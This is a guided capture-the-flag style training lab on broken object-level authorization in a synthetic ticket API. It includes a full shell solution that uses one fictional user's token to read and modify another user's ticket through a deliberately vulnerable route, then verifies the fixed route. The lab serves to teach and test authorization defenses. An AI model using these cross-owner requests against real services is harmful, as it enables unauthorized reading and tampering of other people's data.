# Lab 14 — Ticket Boundaries

## Where commands run

### HOST

Your own machine in the project directory. Run lifecycle and verification commands here. The `shell` command opens TOOLBOX.

### TOOLBOX

The isolated Linux shell. Run `curl` and `jq` here; `ticket-api` resolves only inside this lab's internal network.

### PORTAL

The browser application at `http://127.0.0.1:5173/`. Save the Finding / Evidence source / Impact / Confidence / Recommended remediation report and submit flags here.

**Level:** Intermediate · **Mode:** Guided · **Time:** 70 minutes

**Difficulty band:** intermediate-capstone

## Scenario

ApertureOps ticket URLs include object IDs. A developer believes login is enough to protect them. You are authorized to use two fictional users and two synthetic tickets to test that claim inside this local lab only. Compare cross-owner and owner requests for both reads and writes, then verify the repaired boundary. Do not send these requests to any external target.

## What you need to know

Authentication answers “who is calling?” Authorization answers “may this caller perform this operation on this object?” Broken object-level authorization (BOLA) occurs when a service fetches an object by a caller-controlled ID without checking that caller's permission. Read and write permissions must each be checked server-side. A strong test contains negative cross-owner cases and positive owner cases so a fix does not merely reject everyone.

`POST /case` supplies Mina and Noah tokens and ticket IDs. Send a token as `X-Lab-Token`. `/vulnerable/tickets/ID` checks login but not ownership. `/fixed/tickets/ID` checks ownership for `GET` and `PATCH`. Flags are returned only with validated evidence reports.

## Start the lab

**HOST — start and enter the lab**

```sh
node scripts/standalone-labctl.mjs start 14-object-authorization
node scripts/standalone-labctl.mjs shell 14-object-authorization
```

Keep a second HOST terminal for flag verification. All investigation requests run in TOOLBOX.

## Objectives

### Flag 1 — Prove cross-owner object access (`exposure-report`)

Create a case. As Mina, read and change Noah's ticket through the vulnerable route. Compare those results with fixed cross-owner requests and Noah's own fixed requests. Submit all six status observations to `/reports/exposure`, then save the returned evidence report in PORTAL.

### Flag 2 — Verify ownership enforcement (`remediation-proof`)

Use the exposure token to submit the four controls: owner filtering, read checks, write checks, and cross-owner denial. Confirm that both forbidden operations fail and both intended operations succeed. Save the remediation evidence report before submitting its flag.

## Hints

### Flag 1 — exposure-report

<details>
<summary>Hint 1 — where to look</summary>

The case JSON maps each fictional user to a token and each user to one ticket ID. Work only with those values.

</details>

<details>
<summary>Hint 2 — what to try</summary>

Use Mina's token with Noah's ticket ID. Test `GET` and `PATCH` against both route prefixes, then repeat fixed requests with Noah's token.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

A PATCH body is `{"status":"closed"}` or `{"status":"open"}`. Send it with `-X PATCH -H 'Content-Type: application/json'` and `X-Lab-Token`.

</details>

### Flag 2 — remediation-proof

<details>
<summary>Hint 1 — where to look</summary>

The six validated observations establish confidentiality, integrity, denial, and preserved owner access.

</details>

<details>
<summary>Hint 2 — what to try</summary>

Use the exact `exposure_token` from Flag 1. Control values are JSON booleans, not strings.

</details>

<details>
<summary>Hint 3 — concrete help</summary>

Set `filter_by_owner`, `authorize_each_read`, `authorize_each_write`, and `deny_cross_owner` to `true`.

</details>

## Solution

**TOOLBOX — create a case and test the vulnerable boundary**

```sh
curl -sS -X POST -H 'Content-Type: application/json' -d '{}' http://ticket-api:8080/case > /tmp/case.json
case_id=$(jq -r .case_id /tmp/case.json)
mina_token=$(jq -r .users.mina.token /tmp/case.json)
noah_token=$(jq -r .users.noah.token /tmp/case.json)
mina_ticket=$(jq -r .tickets.mina /tmp/case.json)
noah_ticket=$(jq -r .tickets.noah /tmp/case.json)
status() { curl -sS -o /tmp/ticket-response.json -w '%{http_code}' "$@"; }

vulnerable_cross_owner_read=$(status -H "X-Lab-Token: $mina_token" "http://ticket-api:8080/vulnerable/tickets/$noah_ticket")
vulnerable_cross_owner_write=$(status -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"closed"}' "http://ticket-api:8080/vulnerable/tickets/$noah_ticket")
fixed_cross_owner_read=$(status -H "X-Lab-Token: $mina_token" "http://ticket-api:8080/fixed/tickets/$noah_ticket")
fixed_cross_owner_write=$(status -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"closed"}' "http://ticket-api:8080/fixed/tickets/$noah_ticket")
fixed_owner_read=$(status -H "X-Lab-Token: $noah_token" "http://ticket-api:8080/fixed/tickets/$noah_ticket")
fixed_owner_write=$(status -X PATCH -H 'Content-Type: application/json' -H "X-Lab-Token: $mina_token" -d '{"status":"open"}' "http://ticket-api:8080/fixed/tickets/$mina_ticket")
```

**TOOLBOX — derive the report from the six captured statuses**

```sh
observations=$(jq -cn \
  --argjson a "$vulnerable_cross_owner_read" --argjson b "$vulnerable_cross_owner_write" \
  --argjson c "$fixed_cross_owner_read" --argjson d "$fixed_cross_owner_write" \
  --argjson e "$fixed_owner_read" --argjson f "$fixed_owner_write" \
  '{vulnerable_cross_owner_read:$a,vulnerable_cross_owner_write:$b,fixed_cross_owner_read:$c,fixed_cross_owner_write:$d,fixed_owner_read:$e,fixed_owner_write:$f}')
printf '%s\n' "$observations" | jq .
exposure=$(jq -cn --arg case_id "$case_id" --argjson observations "$observations" '{case_id:$case_id,observations:$observations}' | curl -sS -X POST -H 'Content-Type: application/json' --data-binary @- http://ticket-api:8080/reports/exposure)
printf '%s\n' "$exposure" | jq .
exposure_token=$(printf '%s' "$exposure" | jq -r .exposure_token)
jq -cn --arg case_id "$case_id" --arg exposure_token "$exposure_token" '{case_id:$case_id,exposure_token:$exposure_token,controls:{filter_by_owner:true,authorize_each_read:true,authorize_each_write:true,deny_cross_owner:true}}' | curl -sS -X POST -H 'Content-Type: application/json' --data-binary @- http://ticket-api:8080/reports/remediation | jq .
```

**HOST — verify each displayed flag**

```sh
node scripts/standalone-labctl.mjs verify 14-object-authorization exposure-report 'RLAB{...}'
```

**HOST — submit the remediation flag**

```sh
node scripts/standalone-labctl.mjs verify 14-object-authorization remediation-proof 'RLAB{...}'
```

## What this taught you

An unpredictable object ID is not an authorization control. The server must bind each lookup and mutation to the authenticated identity and permitted operation. Cross-owner denial proves protection; owner success proves the application remains usable. Scope the conclusion to this synthetic service and retain the HTTP evidence in the report.

## Stop or reset

Stop removes containers; submitted progress stay the same and flags stay the same.

**HOST — routine stop**

```sh
node scripts/standalone-labctl.mjs stop 14-object-authorization
```

Reset deletes this lab's progress and creates new flags.

**HOST — destructive reset**

```sh
node scripts/standalone-labctl.mjs reset 14-object-authorization
```
